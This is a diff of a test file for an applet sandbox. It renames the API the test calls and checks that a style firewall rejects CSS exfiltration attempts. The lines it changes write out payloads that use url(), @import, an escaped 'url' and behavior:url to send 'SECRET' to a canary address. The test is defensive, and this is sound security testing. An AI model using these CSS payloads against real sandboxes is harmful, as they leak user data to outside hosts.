@@ -8,14 +8,14 @@ import {Box, Text} from '../../../src/applet/remote-elements';
 
 const CANARY = 'http://localhost:4399/styled-exfil?d=SECRET';
 
-function App({clinical}: any) {
+function App({session}: any) {
   React.useEffect(() => {
     // 1) stylesheet exfil attempts (each should be rejected with ok:false)
-    void clinical.registerStylesheet({css: `.a{background:url(${CANARY})}`});
-    void clinical.registerStylesheet({css: `@import url(${CANARY});`});
-    void clinical.registerStylesheet({css: `.b{background:\\75rl(${CANARY})}`});
-    void clinical.registerStylesheet({css: `.c{behavior:url(${CANARY})}`});
-  }, [clinical]);
+    void session.styles.add(`.a{background:url(${CANARY})}`);
+    void session.styles.add(`@import url(${CANARY});`);
+    void session.styles.add(`.b{background:\\75rl(${CANARY})}`);
+    void session.styles.add(`.c{behavior:url(${CANARY})}`);
+  }, [session]);
   // 2) inline-style exfil — the firewall must reject this style prop (cuts off)
   return React.createElement(
     Box,
